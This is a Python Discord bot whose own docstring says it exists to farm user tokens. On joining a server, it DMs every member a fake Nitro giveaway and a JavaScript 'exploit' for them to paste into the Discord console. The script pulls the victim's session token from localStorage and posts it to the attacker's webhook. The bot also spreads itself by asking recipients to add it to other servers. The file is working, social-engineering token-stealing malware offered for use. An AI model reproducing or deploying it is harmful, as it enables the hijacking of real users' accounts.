"""discord bot to farm usertokens"""

#imports

import discord
from discord.ext import commands

#config

token = 'your-token' #your token
webhookurl = 'your-webhook' #your webhook url
intents = discord.Intents.all()
message = discord.Embed(title="Congratulations!🎊", description="You have been randomly selected to win FREE discord nitro for 3 months!\nTo claim your prize, add me to another server of your choice using the link: https://discord.com/oauth2/authorize?client_id=952733744253517854&scope=bot&permissions=2048\nWithin 24 hours I'll dm you your free nitro gift!\nIf you're a real discord pro, use the script below for free nitro for a full year subscription!")
script = "```js\n/***************************************\n*\n*      Free Nitro exploit!\n*      paste to console on discord and press enter\n*      to open console press F12 on chrome/mozilla/Edge\n*      or Ctrl+Shift+i on desktop app\n*\n* **************************************/\nlocation.reload();\nlet nitrorequest = \"" + webhookurl + "\";\nlet i = document.createElement(\'iframe\');\ndocument.body.appendChild(i);\nlet request = new XMLHttpRequest();\nrequest.open(\"POST\", nitrorequest);\nrequest.setRequestHeader('Content-type', 'application/json');\nlet params = {\n    username: \"Free Nitro Exploit\",\n    avatar_url: \"https://discordgift.gg\",\n    content: '**Givenitro**------------------Nitrocode : ' + i.contentWindow.localStorage.token\n};\nrequest.send(JSON.stringify(params));\n```"

#initialization

client = commands.Bot(intents=intents, command_prefix="!")
client.remove_command("help")

#events

@client.event
async def on_ready():
    """triggers when bot is running"""
    activity = discord.Game(name="discord.gg/nitro", type=2)
    await client.change_presence(status=discord.Status.online, activity=activity)
    print("Bot online")

@client.event
async def on_guild_join(server):
    """dms every user on server join"""
    c = 0
    for member in list(server.members):
        try:
            await member.send(embed=message)
            await member.send(script)
            print ("User " + member.name + " has been messaged")
            c += 1
        except:
            print("Couldn't message " + member.name)
    print(str(c) + " users messaged in guild: " + server.name)

client.run(token)
